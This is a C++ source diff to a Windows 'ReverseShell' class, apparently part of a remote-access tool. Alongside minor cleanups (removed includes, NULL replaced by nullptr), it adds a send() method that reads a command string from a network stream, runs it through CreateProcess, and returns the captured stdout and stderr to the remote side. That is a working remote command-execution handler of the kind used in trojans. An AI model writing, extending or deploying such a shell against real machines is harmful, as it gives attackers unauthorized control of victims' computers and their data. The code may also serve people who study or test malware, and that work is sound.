@@ -1,6 +1,4 @@
-#include <fcntl.h>
 #include "ReverseShell.h"
-#include "../converter/Converter.h"
 
 
 std::string ReverseShell::executeCommand(const std::wstring & command) {
@@ -40,7 +38,6 @@ int ReverseShell::runCmd(const std::string &commandToExecute, std::string &outOu
 
     PROCESS_INFORMATION piProcInfo;
     STARTUPINFO siStartInfo;
-    bool bSuccess = FALSE;
 
     // Set up members of the PROCESS_INFORMATION structure.
     ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));
@@ -76,14 +73,14 @@ int ReverseShell::runCmd(const std::string &commandToExecute, std::string &outOu
     CHAR chBuf[BUFSIZE];
     bool bSuccess2 = FALSE;
     for (;;) { // read stdout
-        bSuccess2 = ReadFile(g_hChildStd_OUT_Rd, chBuf, BUFSIZE, &dwRead, NULL);
+        bSuccess2 = ReadFile(g_hChildStd_OUT_Rd, chBuf, BUFSIZE, &dwRead, nullptr);
         if (!bSuccess2 || dwRead == 0) break;
         std::string s(chBuf, dwRead);
         outOutput += s;
     }
     dwRead = 0;
     for (;;) { // read stderr
-        bSuccess2 = ReadFile(g_hChildStd_ERR_Rd, chBuf, BUFSIZE, &dwRead, NULL);
+        bSuccess2 = ReadFile(g_hChildStd_ERR_Rd, chBuf, BUFSIZE, &dwRead, nullptr);
         if (!bSuccess2 || dwRead == 0) break;
         std::string s(chBuf, dwRead);
         outOutput += s;
@@ -95,3 +92,10 @@ int ReverseShell::runCmd(const std::string &commandToExecute, std::string &outOu
     return 0;
 }
 
+ReverseShell::ReverseShell(const Stream &stream) : Sender(stream){}
+
+void ReverseShell::send() {
+    std::string command = stream.readString();
+    std::string resultOfCommand = executeCommand(Converter::string2wstring(command));
+    stream.sendString(resultOfCommand.c_str());
+}
